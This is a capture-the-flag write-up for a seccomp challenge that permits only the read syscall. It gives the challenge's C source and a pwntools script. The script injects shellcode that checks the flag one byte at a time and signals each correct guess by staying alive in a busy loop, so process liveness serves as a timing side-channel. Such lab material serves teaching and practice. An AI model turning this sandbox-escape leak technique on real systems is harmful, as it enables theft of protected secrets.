---
title: "Timing side-channel via Busy Loop"
description: "Using an infinite calculation loop to create a timing side-channel for leaking data when all traditional output syscalls are blocked."
date: "2025-12-30"
order: 12
draft: true
---

# Timing side-channel via Busy Loop

## Challenge Source Code

```c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

int main(int argc, char **argv, char **envp)
{
    assert(argc > 1);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);

    int shellcode_size = read(0, shellcode, 0x1000);

    scmp_filter_ctx ctx;

    ctx = seccomp_init(SCMP_ACT_KILL);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```

## Vulnerability Analysis

This level is even more restrictive than the nanosleep challenge. Only `read` is allowed. Every other syscall is blocked and kills the process.

This means we cannot even use `nanosleep` to create a delay. However, we can create a delay using CPU instructions. An infinite loop (or a very long loop) keeps the process alive, while any forbidden syscall kills it instantly.

This difference in "life expectancy" (alive vs. dead) is our side-channel.

## Exploitation Plan

1. **Read Flag:** Read the flag from the pre-opened FD 3.
2. **Compare Byte:** Check if `flag[i] == guess`.
3. **Busy Loop:**
  *   If correct: Enter an infinite loop (`jmp $`).
  *   If wrong: Trigger a forbidden syscall (e.g., `write`).
4. **Measure Time:** The python script waits for a short period (e.g., 0.5s) and checks if the process is still running. If it is, the guess was correct.

## Exploit Script

```python
from pwn import *
import time

elf = context.binary = ELF("./challenge")

flag = ""
index = 0

while True:
    found = False
    for char_code in range(32, 127):
        shellcode = asm(f"""
            /* read(3, stack, 100) */
            mov rdi, 3
            mov rsi, rsp
            mov rdx, 100
            mov rax, 0
            syscall

            /* Compare buffer[index] with guess */
            movzx rax, byte ptr [rsp + {index}]
            cmp rax, {char_code}
            je busy_loop

            /* Kill immediately if wrong (forbidden syscall) */
            mov rax, 60
            syscall

        busy_loop:
            jmp busy_loop
        """)

        # Run process
        p = process([elf.path, "/flag"], level='error')
        p.send(shellcode)

        # Allow it to run for a bit
        time.sleep(0.5)

        # Check if it's still alive
        if p.poll() is None:
            # Alive! Correct guess.
            flag += chr(char_code)
            print(f"Found: {chr(char_code)} | Flag: {flag}")
            found = True
            p.kill()
            p.close()
            break

        p.close()

    if not found:
        print("End of flag or char not found.")
        break
    index += 1
print(f"\nFinal Flag: {flag}")
```
